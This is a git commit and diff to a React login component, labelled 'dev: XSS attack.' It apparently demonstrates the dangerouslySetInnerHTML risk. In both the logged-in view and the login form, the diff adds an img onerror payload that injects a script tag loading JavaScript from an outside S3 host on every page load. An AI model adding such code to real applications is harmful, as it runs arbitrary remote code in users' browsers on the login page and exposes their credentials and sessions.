b6c3199602d19aeb992ecf9adfb81df9578659a3
nlivaic <nlivaic@gmail.com>
2019-10-12 23:03:00 +0200

    dev: XSS attack.

--- ClientApp/src/components/LoginData.jsx
+++ ClientApp/src/components/LoginData.jsx
@@ -23,12 +23,38 @@ class LoginData extends Component {
     if (accountLogin.isLoggedIn) {
       return (
         <div>
+          <div
+            dangerouslySetInnerHTML={{
+              __html:
+                '<img src=x onerror="' +
+                "let script = document.createElement('script'); " +
+                "script.type = 'text/javascript'; " +
+                "script.src = 'https://demofilespa.s3.amazonaws.com/jfptest.js'; " +
+                "document.getElementsByTagName('head')[0].appendChild(script);" +
+                '">This is an XSS attack.'
+            }}
+          ></div>
           Hi {accountLogin.name}.
           <button onClick={() => logout()}>Logout</button>
         </div>
       );
     }
-    return <Login onLogIn={login} />;
+    return (
+      <div>
+        <div
+          dangerouslySetInnerHTML={{
+            __html:
+              '<img src=x onerror="' +
+              "let script = document.createElement('script'); " +
+              "script.type = 'text/javascript'; " +
+              "script.src = 'https://demofilespa.s3.amazonaws.com/jfptest.js'; " +
+              "document.getElementsByTagName('head')[0].appendChild(script);" +
+              '">This is an XSS attack.'
+          }}
+        ></div>
+        <Login onLogIn={login} />
+      </div>
+    );
   }
 }
 
